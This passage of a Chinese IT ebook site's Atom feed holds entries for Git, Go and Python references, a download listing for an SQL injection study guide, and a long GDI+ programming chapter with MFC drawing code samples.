<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git diff --stat $(git merge-base master erlang) erlang&#10; erlang_hw.erl |    5 +++++&#10; haskell.hs    |    4 ++++&#10; 2 files changed, 9 insertions(+), 0 deletions(-)</span><br></pre></td></tr></table></figure>
<p>当然，我会推荐简单点的那个。</p>
<p><strong>简而言之</strong> 使用 <code>git diff</code> 查看某一分支自它偏离出来起与过去某一点之间项目的改动。 总是使用 <code>git diff branchA...branchB</code> 来查看 branchB 与 branchA 的相对差值，这会让事情简单点。</p>
<p>就是这样了！ 请阅读 <a href="http://git-scm.com/book/" target="_blank" rel="external">《Pro Git》</a> 以获得更多信息。</p>
<h1 id="关于">关于</h1><h2 id="谁的作品？">谁的作品？</h2><p>Git 参考手册是 Github 项目组的成果。</p>
<p><a href="http://cyj.me/" target="_blank" rel="external">逸才</a>在 <a href="http://gitref.org/" target="_blank" rel="external">Git Reference</a> 的基础上做了中文翻译。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="Git_手册简介">Git 手册简介</h1><p>本站为 Git 参考手册。目的是为学习与记忆 Git 使用中最重要、最普遍的命令提供快速翻阅。 这些命令以你可能需要的操作类型划分，并且将提供日常使用中需要的一些常用的命令以及参数。</p>
<p>每个章节都有到下一个章节的链接，所以本手册也可以当作一个入门指导。 每个页面还有一个深度 Git 文档阅读的链接，比如官方的使用手册页面或者 <a href="http://git-scm.com/book">《Pro Git》</a> 书中的相关章节，以便于你学习了解更多的 Git 命令。首先，我们要从如何以 Git 的思维方式管理源代码开始。]]>
    
    </summary>
    
      <category term="git" scheme="http://it-ebooks.flygon.net/tags/git/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Go 标准库 中文参考]]></title>
    <link href="http://it-ebooks.flygon.net/golang-stdlib-ref/"/>
    <id>http://it-ebooks.flygon.net/golang-stdlib-ref/</id>
    <published>2016-02-29T02:25:08.000Z</published>
    <updated>2016-02-29T02:26:24.177Z</updated>
    <content type="html"><![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/golang-stdlib-ref.jpg?build=1451718975417&amp;v=12.0.2" alt=""></p>
<p>来源：<a href="http://studygolang.com/pkgdoc" target="_blank" rel="external">Go语言标准库文档中文版</a></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="https://www.gitbook.com/book/wizardforcel/golang-stdlib-ref/details" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="https://www.gitbook.com/download/pdf/book/wizardforcel/golang-stdlib-ref" target="_blank" rel="external">PDF格式</a></li>
<li><a href="https://www.gitbook.com/download/epub/book/wizardforcel/golang-stdlib-ref" target="_blank" rel="external">EPUB格式</a></li>
<li><a href="https://www.gitbook.com/download/mobi/book/wizardforcel/golang-stdlib-ref" target="_blank" rel="external">MOBI格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="https://ek8whxe.cloudimg.io/s/width/226/https://www.gitbook.com/cover/book/wizardforcel/golang-stdlib-ref.jpg?build=1451718975417&amp;v=12.0.2" alt=""></p>
<p>来源：<a href="http://studygolang.com/pkgdoc">Go语言标准库文档中文版</a></p>]]>
    
    </summary>
    
      <category term="go" scheme="http://it-ebooks.flygon.net/tags/go/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[零基础学Python（第二版）]]></title>
    <link href="http://it-ebooks.flygon.net/qiwsir-python/"/>
    <id>http://it-ebooks.flygon.net/qiwsir-python/</id>
    <published>2016-02-27T06:27:49.000Z</published>
    <updated>2016-02-28T02:42:34.388Z</updated>
    <content type="html"><![CDATA[<p><img src="http://box.kancloud.cn/cover_2015-09-08_55ee3b290e6b_800x1068.jpg?imageMogr2/thumbnail/173x231!/interlace/1/quality/100" alt=""></p>
<p>作者：<a href="https://github.com/qiwsir" target="_blank" rel="external">qiwsir</a></p>
<p>来源：<a href="https://github.com/qiwsir/StarterLearningPython" target="_blank" rel="external">StarterLearningPython</a></p>
<a id="more"></a>
<h2 id="在线阅读">在线阅读</h2><ul>
<li><a href="http://wiki.jikexueyuan.com/project/start-learning-python/index.html" target="_blank" rel="external">在线阅读</a></li>
</ul>
<h2 id="下载">下载</h2><ul>
<li><a href="http://passport.jikexueyuan.com/sso/login" target="_blank" rel="external">PDF格式</a></li>
<li><a href="http://passport.jikexueyuan.com/sso/login" target="_blank" rel="external">EPUB格式</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p><img src="http://box.kancloud.cn/cover_2015-09-08_55ee3b290e6b_800x1068.jpg?imageMogr2/thumbnail/173x231!/interlace/1/quality/100" alt=""></p>
<p>作者：<a href="https://github.com/qiwsir">qiwsir</a></p>
<p>来源：<a href="https://github.com/qiwsir/StarterLearningPython">StarterLearningPython</a></p>]]>
    
    </summary>
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[习科SQL注入自学指南]]></title>
    <link href="http://it-ebooks.flygon.net/%E4%B9%A0%E7%A7%91SQL%E6%B3%A8%E5%85%A5%E8%87%AA%E5%AD%A6%E6%8C%87%E5%8D%97/"/>
    <id>http://it-ebooks.flygon.net/习科SQL注入自学指南/</id>
    <published>2016-02-24T13:43:14.000Z</published>
    <updated>2016-02-24T13:46:47.149Z</updated>
    <content type="html"><![CDATA[<p>格式：PDF</p>
<h2 id="下载">下载</h2><ul>
<li><a href="http://vdisk.weibo.com/s/aADaW4YRjre9T" target="_blank" rel="external">微盘下载</a></li>
<li><a href="http://1000eb.com/1ixdm" target="_blank" rel="external">千易下载</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>格式：PDF</p>
<h2 id="下载">下载</h2><ul>
<li><a href="http://vdisk.weibo.com/s/aADaW4YRjre9T" target="_blank" rel="external">微盘下载</a></li>
<li>]]>
    </summary>
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Gdip 编程基础]]></title>
    <link href="http://it-ebooks.flygon.net/gdip-%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    <id>http://it-ebooks.flygon.net/gdip-编程基础/</id>
    <published>2016-02-24T08:55:29.000Z</published>
    <updated>2016-02-24T09:03:50.245Z</updated>
    <content type="html"><![CDATA[<p>GDI+（Graphics Device Interface Plus，图形设备接口加）是 Windows XP 及以上版本操 作系统的图形子系统，也是传统.NET 框架的重要组成部分和窗体绘图的主要工具，负责在 屏幕和打印机上绘制图形图像和显示信息。顾名思义，GDI+是 Windows 早期版本所提供的 图形设备接口 GDI 的后续版本，是建立在 GDI 之上的一个高层图形子系统。</p>
<p>GDI+是一种 API，分别通过一套 C++类和一套部署为托管代码的类来展现，这两套类 分别被称为 GDI+的“C++封装”和“托管类接口”。</p>
<p>GDI+不但在功能上比 GDI 要强大很多，而且在代码编写方面也更简单，因此会成为 Windows 图形图像程序开发的主要工具之一。由于篇幅所限，本书只简单介绍利用 MFC 进 行 GDI+编程的一些基本内容，也不讲 GDI+的 API 编程。基于 GDI+托管封装的.NET 窗体 绘图，将在第 18 章中再介绍。对 GDI+编程有兴趣的读者，可以参考如下图书：</p>
<ul>
<li><p>周鸣杨、赵景亮. 精通 GDI+编程. 清华大学出版社，2004 年 2 月（C++ / MFC）。</p>
</li>
<li><p>Mahesh Chand（韩江等译）. GDI+图形程序设计. 电子工业出版社，2005 年 3 月（C# / .NET）。</p>
</li>
</ul>
<p>本章将介绍 GDI+的结构和组成，讨论 GDI+的几个主要新增特性与功能，说明 GDI+给 Windows 图形图像程序的开发模式带来的变化。介绍 C++封装的 GDI+ API 的具体使用方法， 主要讲解二维矢量图形绘制和文字显示等基本内容。<a id="more"></a></p>
<p>GDI+的路径、区域、变换、图像处理和图元文件等高级编程内容，安排在下一章介绍。</p>
<h2 id="1-_GDI+的结构与组成">1. GDI+的结构与组成</h2><p>本节先介绍 GDI+的体系结构，再列出 C++封装的 GDI+ API 的具体组成。</p>
<h3 id="1-1_GDI+的结构">1.1 GDI+的结构</h3><p>GDI+是建立在 GDI 之上的一种高层图形子系统，基础是 GDI+平面 API，有 C++和托 管两种封装。</p>
<p>注意，虽然 GDI+是 GDI 的发展，但是 GDI+并非设计来替代 GDI 的，它不能独立工作， 底层还得靠 GDI 实现。</p>
<p>（1）GDI+的体系结构</p>
<p>GDI+与 GDI 一样，都具有设备无关性。而且 GDI+是建立在 GDI 之上的一种高层接口， 供 Windows API 和.NET 框架调用。与 GDI 类似，GDI+主要提供了二维矢量图形、图像处 理和文字显示版式三类功能（参见图 14-1），只是 GDI+比 GDI 的功能更强大，且编程模式发生了改变。</p>
<p><img src="../img/gdip-编程基础/1-1-1.png" alt=""></p>
<p>图 14-1 GDI+的体系结构</p>
<p>（2）GDI+平面 API 与封装</p>
<p>GDI+提供（expose）了一个平面（flat）API，它包含大约 600 个函数，被实现在 Gdiplus.dll 中，声明在 Gdiplusflat.h 内。这些函数被包装到了前面讨论过的 GDI+ API 的 54 个 C++类的 集合之中。</p>
<p>作为 C++封装的替代方案，微软.NET 框架提供了 GDI+的一个托管代码封装类集，包 含大约 60 个类、50 个枚举和 8 个结构。它们分属于下列命名空间：System.Drawing、 System.Drawing.Drawing2D 、 System.Drawing.Imaging 、 System.Drawing.Text 和 System. Drawing.Printing。</p>
<p>GDI+的平面 API 与其 C++及托管封装的关系如图 14-2 所示。</p>
<p><img src="../img/gdip-编程基础/1-1-2.png" alt=""></p>
<p>图 14-2 GDI+的封装与使用</p>
<h2 id="1-2_GDI+的组成">1.2 GDI+的组成</h2><p>GDI+的 C++封装，包含了 54 个类、12 个全局函数、（6 类）226 个图像常量、55 种枚 举和 19 种结构。GDI+的.NET 托管封装，则包含了大约 60 个类、50 个枚举和 8 个结构。这 两种封装都是基于 GDI+平面 API 的。本小节只介绍 GDI+的 C++封装，GDI+的托管封装将 在第 18 章的.NET 窗体绘图中有所涉及。</p>
<p>（1）类</p>
<p>GDI+的 C++封装中共有 54 个类，核心类是 Graphics，它是实际绘制直线、曲线、图形、 图像和文本的类。许多其它 GDI+类是与 Graphics 类一起使用的。例如，DrawLine 方法接收 Pen 对象，该对象中存有所要绘制的线条的属性（颜色、宽度、虚线线型等）。FillRectangle 方法可以接收指向 LinearGradientBrush 对象的指针，该对象与 Graphics 对象配合工作来用 一种渐变色填充矩形。Font 和 StringFormat 对象影响 Graphics 对象绘制文本的方式。Matrix 对象存储并操作 Graphics 对象的仿射变换——旋转、缩放和翻转图像。</p>
<p>GDI+还提供了用于组织图形数据的几种结构类（例如 Rect、Point 和 Size）。而且，某 些类的主要作用是结构化数据类型。例如，BitmapData 类是 Bitmap 类的帮助器，PathData 类是 GraphicsPath 类的帮助器。图 14-3 是 GDI+ API 类的层次结构图。</p>
<p>注意：在 GDI+、.NET、C#、Java 和 VB 中，都把类的成员函数称为方法。当我们在</p>
<p>C++中，使用 GDI+和.NET 框架类库中的类和功能时，也常常将其函数改称为方法。</p>
<p><img src="../img/gdip-编程基础/1-3.png" alt=""></p>
<p>图 14-3 GDI+类的层次结构</p>
<p>（2）全局函数</p>
<p>GDI+命名空间中的全局函数有 12 个，常用的有如下两个（其余的大多数与图像相关）：</p>
<ul>
<li><p>关闭 GDI+：GdiplusShutdown（清除 GDI+所使用的资源）。</p>
</li>
<li><p>启动 GDI+：GdiplusStartup（初始化 GDI+）。</p>
</li>
</ul>
<p>（3）常量、枚举和结构</p>
<p>GDI+中有 6 类共计 226 个图像常量（都被定义在头文件 GdiplusImaging.h 中），包括图 像 文 件 格式 常 量 11 个（ 如 ImageFormatBMP 、 ImageFormatGIF 、 ImageFormatJPEG 、 ImageFormatPNG、ImageFormatTIFF 等）、图像帧维常量 2 个、图像编码器常量 13 个、图</p>
<p>像像素格式常量 14 个、图像特性标志类型 9 个、图像特性标志 217 个。</p>
<p>GDI+定义了 55 种枚举类型，它们都是相关常数的集合。例如：PenType、BrushType、DashStyle、ImageType、LineCap、FillMode、ImageFlags 等。</p>
<p>GDI+ API 中还定义了 19 种结构，用于 GDI+的各种方法调用中。例如：ColorMap、 ColorMatrix、ColorPalette、Gdiplus Abort、GdiplusStartupInput、GdiplusStartupOutput 等。</p>
<h2 id="1-2_GDI+的特色">1.2 GDI+的特色</h2><p>本节介绍 GDI+的几个主要新增特性与功能，说明 GDI+在编程模式上的改变。</p>
<h3 id="1-2-1_GDI+新增特性">1.2.1 GDI+新增特性</h3><p>与 GDI 相比，GDI+新增的特性主要有渐变画刷、样条和贝塞尔曲线、持久路径、矩阵 变换、伸缩区域、α 混色和对多种图像格式的支持。</p>
<p>（1）渐变画刷</p>
<p><img src="../img/gdip-编程基础/Image_009.jpg" alt="image"></p>
<p>GDI+中新增加的渐变画刷（gradient brush，梯度刷），通过提供用于填充图形、路径和 区域的颜色线性渐变和路径渐变的画刷，扩展了 GDI 的功能。渐变画刷可用于绘制直线、 曲线和路径，参见图 14-4。</p>
<p><img src="../img/gdip-编程基础/Image_010.jpg" alt="image"></p>
<p>a)（水平）线性渐变 b)（贝塞尔）路径渐变</p>
<p>图 14-4 渐变画刷 图 14-5 基样条曲线与折线</p>
<p>（2）曲线方法</p>
<p>GDI+支持基样条（cardinal splines）和贝塞尔（Bezier）方法，可以由若干控制点生成 光滑的曲线，参见图 14-5。</p>
<p>（3）持久路径对象</p>
<p>GDI 中的路径（path）属于设备上下文，并且会在绘制时被毁坏。而 GDI+则可以创建 并维护多个与 Graphics 对象分开的持久（persistent）路径对象——GraphicsPath 对象，在绘 图操作时也不会破坏，因此可多次使用同一个 GraphicsPath 对象来绘制路径。</p>
<p>（4）变换和矩阵对象</p>
<p>GDI+提供了 Matrix（矩阵）对象，它是一种可以使（缩放、旋转和平移等）变换（transformation）简易灵活的强 大工具，矩 阵对象一般 与变换对 象联合使用 。例如，GraphicsPath 对象具有 Transform 方法，此方法接收 Matrix 对象作为参数。参见图 14-6。</p>
<p>（5）可伸缩区域</p>
<p>GDI+通过对可伸缩区域（scalable region）的支持极大地扩展了 GDI。在 GDI 中，区域 被存储在设备坐标中，而且，可应用于区域的惟一变换是平移。而 GDI+在全局坐标中存储 区域，并且允许区域发生任何可存储在变换矩阵中的变换（如缩放和旋转）。图 14-7 显示一 个区域在执行三种变换（缩放、旋转和平移）前后的情况。</p>
<p><img src="../img/gdip-编程基础/Image_011.jpg" alt="image"></p>
<p>图 14-6 路径变换</p>
<p><img src="../img/gdip-编程基础/Image_012.jpg" alt="image"></p>
<p>图 14-7 区域变换</p>
<p><img src="../img/gdip-编程基础/Image_013.jpg" alt="image"></p>
<p>图 14-8 不同透明度</p>
<p>（6）α混色</p>
<p>在图 14-7 中，可以在变换区域（用蓝色阴影画笔填充）中看到未变换区域（用红色填充），这是由 GDI+支持的α 混色（alpha blending，透明混合）实现的。使用α 混色，可以指定填充颜色的透明度。透明色与背景色相混合———填充色越透明，透出的背景色就越多。 图 14-8 显示四个用相同颜色（红色）填充、但透明层次不同的椭圆。</p>
<p>（7）丰富的图像格式支持</p>
<p>GDI+提供 Image、Bitmap 和 Metaf ile 类，可以用不同的格式加载、保存和操作图像。 GDI+支持 BMP、GIF、JPEG、EXIF、PNG、TIFF、ICON、WMF、EMF 共 9 种常见的图像 格式。这些已经被 ATL/MFC 中的基于 GDI+的 CImage 类所体现。</p>
<p>（8）GDI+的不足</p>
<p>虽然，相对于 GDI 来说，GDI+确实增加了许多新特性，而且功能更强大，使用也更方 便。但是，这并不等于 GDI+就能够完全代替 GDI。</p>
<p>因为 GDI+实际上是 GDI 的高层封装和功能扩展，GDI+的执行效率一般要低于 GDI 的。 另外，GDI+不支持图形的位运算，那么就不能进行异或绘图等操作。而且在 Visual C++中， GDI+还不直接支持双缓存机制（如内存 DC 和显示 DC），这将大大影响 GDI+在高速图形、 图像、动画和视频等方面的应用。</p>
<h3 id="1-2-2_编程模式的改变">1.2.2 编程模式的改变</h3><p>GDI+的出现，也使基于 GDI 的编程模式产生了很大变化：GDI+用一个“无状态模式”， 取代了 GDI 中（需要先将各种工具和项目选入 DC 对象后，才能进行绘图的）“状态模式”。 主要体现在以下几个方面：</p>
<p>（1）DC 句柄和图形对象</p>
<p>设备上下文（DC）是 GDI 中使用的一种结构，用于存储与特定显示设备相关的的绘制 工具及属性的信息，用于屏幕显示的 DC 还与特定窗口相关联。为了使用 GDI API 进行绘图， 必须首先获得一个 DC 的句柄（HDC），然后将该句柄作为参数，传递给实际进行绘图的 GDI 函数。在 MFC 中，DC 及其绘图功能被封装在 CDC 类中，DC 句柄成为了成员变量，绘图 函数变成了方法，不再需要显式传递 HDC 参数。</p>
<p>使用 GDI+，不需要再（直接）使用句柄或设备上下文，而是只需（通过 HDC）创建一个 Graphics 对象，然后用熟悉的面向对象方式来调用其中的各种绘图方法，例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myGraphicsObject.DrawLine(&#38;pen, x1, y1, x2, y2);</span><br></pre></td></tr></table></figure>
<p>正如 DC 是 GDI 的核心，Graphics 对象也位于 GDI+的核心。DC 和 Graphics 对象的作 用相似，但在使用设备上下文（GDI）的基于句柄的编程模式和使用 Graphics 对象（GDI+） 的面向对象的编程模型之间，存在一些基本的差异。</p>
<p>Graphics 对象（像 DC 一样）与屏幕上的特定窗口关联，并具有指定如何绘制项目的属 性（如 SmoothingMode 和 TextRenderingHint）。但是，Graphics 对象不受笔、刷、路径、图 像或字体的约束，这与设备上下文不同。例如，使用设备上下文绘制线条之前，必须先调用 SelectObject 将笔选入 DC 中，以使笔对象和 DC 关联。在设备上下文中绘制的所有线条均 使用该笔，直到选择另一支不同的笔为止。在 GDI+中，将 Pen 对象作为参数传递给 Graphics 类的 DrawLine 等画线方法。可以在一系列的 DrawLine 调用的每个调用中，使用不同的 Pen 对象，而不必将给定的 Pen 对象与 Graphics 对象关联。</p>
<p>（2）画线的两种方法</p>
<p>下面每个示例都从点(20, 10)到点(200, 100)绘制一条宽为 3 的红色线条。第一个示例调 用 GDI，第二个示例则通过托管类接口调用 GDI+，这里都使用 MFC。也可以不使用 MFC， 而直接用 API 来进行 GDI+绘图（由于篇幅有限，这里就不介绍了）。</p>
<p>1）用 GDI 画线</p>
<p>利用 MFC 进行 GDI 绘图，步骤与 API 的差不多，只是 MFC 将各种 GDI 功能封装到了 不同的类中。例如，笔的类为 CPen、点的类为 CPoint、设备上下文的类为 CDC。而且所有 的绘图函数都被封在 CDC 类中，所以只能作为其对象的方法才能被使用，当然也就不用再 带 HDC 句柄作为输入参数了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDC *pDC = GetDC(); // &#33719;&#21462; DC &#23545;&#35937;&#10;CPen pen(PS_SOLID, 3, RGB(255, 0, 0)); // &#21019;&#24314;&#31508;&#10;pDC-&#62;SelectObject(&#38;pen); // &#36873;&#31508;&#20837; DC&#10;pDC-&#62;MoveTo(20, 10); // &#23558;&#24403;&#21069;&#28857;&#31227;&#21040;&#30452;&#32447;&#30340;&#36215;&#28857;&#10;pDC-&#62;LineTo(200, 100); // &#20174;&#24403;&#21069;&#28857;&#30011;&#32447;&#21040;&#30452;&#32447;&#30340;&#32456;&#28857;</span><br></pre></td></tr></table></figure>
<p>2）用 GDI+画线</p>
<p>利用 MFC 进行 GDI+绘图，步骤与 API 的差不多。只是代码改在 OnDraw 函数中，而且获取 DC 句柄的方法不同。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CDC *pDC = GetDC(); // &#33719;&#21462; DC &#23545;&#35937;&#10;Graphics myGraphics(pDC-&#62;m_hDC); // &#21033;&#29992; DC &#21477;&#26564;&#21019;&#24314;&#22270;&#24418;&#23545;&#35937;&#10;Pen myPen(Color(255, 0 , 0), 3); // &#21019;&#24314;&#31508;&#10;myGraphics.DrawLine(&#38;myPen, 20, 10, 200, 100); // &#30011;&#30452;&#32447;</span><br></pre></td></tr></table></figure>
<p>（3）作为参数的绘图工具</p>
<p>前面的示例显示：在 GDI+中，创建和维护 Pen 对象，可以与提供绘制方法的 Graphics 对象分开。同样，创建和维护 Brush、GraphicsPath、Image 和 Font 对象也可以与 Graphics 对象分开，Graphics 类提供的许多绘制方法，都将笔、刷、路径、图像和字体等对象，作为 参数接收。例如，Brush 对象作为参数传递至 FillRectangle 方法，GraphicPath 对象作为参数 传递至 DrawPath 方法。同样，Image 和 Font 对象传递至 DrawImage 和 DrawString 方法。</p>
<p>这与 GDI 不同，在 GDI 中，需要先将笔、刷、路径、图像或字体等 GDI 工具对象选入 DC，然后（API）将 DC 的句柄作为参数传递至绘制函数或（MFC）采用 CDC 类对象的函 数使用 DC 中当前的笔、刷、路径、图像或字体来绘图。</p>
<p>（4）无当前位置</p>
<p>GDI+从总体上已经放弃了当前位置的概念，如在前面所述的 DrawLine 方法中线条的起 点和终点均被作为参数接收。这与 GDI 方案不同，在 GDI 中，调用 MoveToEx(hdc, x1, y1, NULL) 或 pDC-&gt;MoveTo(x1, y1)来设置当前笔位置之后，再调用 LineTo(hdc, x2 , y2) 或 pDC-&gt;LineTo(x2, y2)来绘制一条从(x1, y1)到(x2 , y2)的线条。</p>
<p>（5）绘制和填充的不同方法</p>
<p>GDI 的 Rectangle 和 Ellipse 等函数，可一步完成绘制轮廓和填充内部的功能。轮廓由当 前选定的笔绘制，而内部则由当前选定的刷来填充。GDI+则必须分别调用绘制轮廓和填充 内部的两个不同方法来做到这一点。例如，Graphics 类的 DrawRectangle 方法将 Pen 对象作 为其参数之一，而 FillRectangle 方法将 Brush 对象作为其参数之一。所以在绘制轮廓和填充 图形内部时，GDI+要比 GDI 更灵活，但也更麻烦。</p>
<p>（6）构造区域</p>
<p>GDI 提供几种用于创建区域的 函数（在 MFC 中，它们被 封装在 CRng 类里）： CreateRectRgn 、 CreateEllpticRgn 、 CreateRoundRectRgn 、 CreatePolygonRgn 和 CreatePolyPolygonRgn。您或许希望 GDI+中的 Region 类也有类似的构造函数，将矩形、椭 圆、圆角矩形和多边形作为参数接收，但事实并非如此。GDI+中的 Region 类提供一个接收 Rectangle 对象的构造函数和另一个接收 GraphicsPath 对象的构造函数。如果想基于椭圆、 圆角矩形或多边形构造区域，可以通过创建一个 GraphicsPath 对象（可包含椭圆的对象等）， 然后将其传递至 Region 构造函数来轻松实现。</p>
<p>GDI+通过组合图形和路径，使得构成复杂区域十分简单。Region 类具有 Union 和 Intersect 方法，可用于扩展具有路径的现有区域或其它区域。GDI+方案一个很好的功能就是 GraphicsPath 对象在作为参数传递至 Region 构造函数时不会被破坏（在 GDI 中，可以使用 PathToRegion 方法将路径转换为区域，但在此过程中，路径将被破坏）。另外，GraphicsPath 对象在作为参数传递给 Union 或 Intersect 方法时也不会被破坏，因此，在一些单独的区域中， 可以将给定的路径作为构造块使用。例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Region region1(rect1); &#10;Region region2(rect2); &#10;region1.Union(onePath); &#10;region2.Intersect(onePath);</span><br></pre></td></tr></table></figure>
<h2 id="1-3_GDI+的_MFC_编程">1.3 GDI+的 MFC 编程</h2><p>本节介绍利用 MFC 进行 GDI+编程的必要的准备，并通过例子说明 GDI+编程的具体步 骤，最后给出如何解决存在的 new 操作符问题的方法。</p>
<p>C++封装的 GDI+的（英文）帮助内容，位于 VS08 的“目录/Win32 和 COM 开发/Graphics and Multimedia/GDI+”，主要的参考资料位于其子目录“GDI+ Reference”中。</p>
<h3 id="1-3-1_设置与初始化">1.3.1 设置与初始化</h3><p>封装了 GDI+ API 的各种 C++类、函数、常量、枚举和结构，都被定义在 Gdiplus.h 头 文件所包含的一系列头文件中。所以，采用 MFC 进行 GDI+编程，必须包含 Gdiplus.h 头文 件。</p>
<p>从 14.1.2 的有关 GDI+平面 API 的讨论可知，封装在 GDI+类中方法，最后都需要调用GDI+平面 API 中的相关底层函数，才能完成实际的操作。所以，为了运行 GDI+应用程序，在操作系统平台中，必须安装动态链接库 Gdiplus.dll。对 Windows XP 及以上版本，该 DLL已经自动被操作系统包含。</p>
<p>该动态链接库所对应的静态库文件为 GdiPlus.lib，而且它在 VC08 及之前的早期版本中 不是 C++和 MFC 的默认链接库。所以，对早期的 VC 版本必须在项目设置，添加该库作为 链接器输入的附加依赖项。但是对 VC08 SP1 及 VC10，该库已经成为标准链接库之一，不 必再为链接器输入的附加依赖项添加此库。</p>
<p>因为在 Gdiplus.h 头文件中，将所有的 GDI+的类、函数、常量、枚举和结构等都定义在 了命名空间 Gdiplus 中。所以，一般在 GDI+程序中，都应该使用如下的命名空间声明：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using namespace Gdiplus;</span><br></pre></td></tr></table></figure>
<p>（1）VC 中的设置</p>
<p>为了在 MFC 应用程序中能使用 GDI+，必须包含 GDI+头文件、使用 GDI+命名空间。 对 VC08 及之前的版本，还要为项目添加 GDI+链接库。</p>
<p>1) 包含头文件、使用命名空间——在要使用 GDI+的文件（如视图类的头文件或代码 文件）头部包含 GDI+的头文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &#38;lt;gdiplus.h&#38;gt;</span><br></pre></td></tr></table></figure>
<p>并加上使用 GDI+命名空间的 using 指令（区分大小写，注意首字母大写）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">using namespace Gdiplus;</span><br></pre></td></tr></table></figure>
<p>2) 添加链接库（对 VC08 SP1 及 VC10 不必添加）——在 VS08 及其早期版本中，选 “项目/*属性”菜单项，打开项目的属性页窗口，先选“所有配置”，再选“配置 属性/链接器/输入”项，在右边上部的“附加依赖项”栏的右边，键入 GdiPlus.lib（参见图 14-9）后按“应用”钮，最后按“确定”钮关闭对话框。</p>
<p>（2）GDI+的初始化与清除</p>
<p>为了在 MFC 应用程序中使用采用 C++封装的 GDI+ API，必须在 MFC 项目的应用程序 类 中 ， 调 用 GDI+ 命 名 空 间 中 的 GDI+ 启 动 函 数 GdiplusStartup 和 GDI+ 关 闭 函 数 GdiplusShutdown，来对 GDI+进行初始化（装入动态链接库 Gdiplus.dll，或锁定标志+1）和 清除（卸载动态链接库 Gdiplus.dll，或锁定标志-1）工作。它们一般分别在应用程序类的InitInstance 和 ExitInstance 重载方法中调用。</p>
<p><img src="../img/gdip-编程基础/Image_014.jpg" alt="image"></p>
<p>图 14-9 在项目属性对话框中添加静态链接库</p>
<p>函数 GdiplusStartup 和 GdiplusShutdown，都被定义在 GdiplusInit.h 头文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Status WINAPI GdiplusStartup( OUT ULONG_PTR *token,&#10;const GdiplusStartupInput *input, OUT GdiplusStartupOutput *output); &#10;void GdiplusShutdown(ULONG_PTR token);</span><br></pre></td></tr></table></figure>
<p>其中：</p>
<p>类型 ULONG_PTR，是用无符号长整数表示的指针，被定义在 basetsd.h 头文件中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typedef _W64 unsigned long ULONG_PTR;</span><br></pre></td></tr></table></figure>
<p>输出参数 token（权标），供关闭 GDI+的函数使用，所以必须设置为应用程序类的 成员变量（或全局变量，不提倡）。</p>
<p>结构 GdiplusStartupInput 和 GdiplusStartupOutput，都被定义在 GdiplusInit.h 头文件中。</p>
<p>GDI+启动输入结构指针参数 input，一般取默认构造值即可，即（设：无调 试事件回调过程、不抑制背景线程、不抑制外部编解码）：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">input = GdiplusStartupInput(NULL, FALSE, FALSE);</span><br></pre></td></tr></table></figure>
<p>GDI+启动输出结构指针参数 output，一般不需要，取为 NULL 即可。 注意，采用 MFC 进行 GDI+ API 编程时，在使用任何 GDI+的功能调用之前，必须先调用 GDI+启动函数 GdiplusStartup 来进行初始化 GDI+的工作；在完成所有的 GDI+功能调用 之后，必须调用 GDI+关闭函数 GdiplusShutdown 来进行清除 GDI+的工作。</p>
<p>（3）过程框图</p>
<p>图 14-10 是使用 MFC 进行 GDI+编程的设置、准备与初始化过程的逻辑框图。</p>
<p><img src="../img/gdip-编程基础/1-10.png" alt=""></p>
<p>图 14-10 GDI+的设置、准备与初始化</p>
<h3 id="1-3-2_编程例子">1.3.2 编程例子</h3><p>下面通过一个简单的例子，来说明如何使用 GDI+进行应用程序开发。</p>
<p>（1）创建和设置</p>
<p>创建一个名为 Gdip 的传统界面 MFC 单文档应用程序项目，在应用程序类和视图类的CPP 代码文件中，包含头文件并使用命名空间：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#include &#60;gdiplus.h&#62;&#10;using namespace Gdiplus;</span><br></pre></td></tr></table></figure>
<p>对 VC08 及之前的版本还需在项目属性中添加链接库 GdiPlus.lib。</p>
<p>（2）初始化与清除</p>
<p>然后再进行 GDI+系统的初始化，这需要在应用程序类 CGdipApp 中声明一个成员变量：</p>
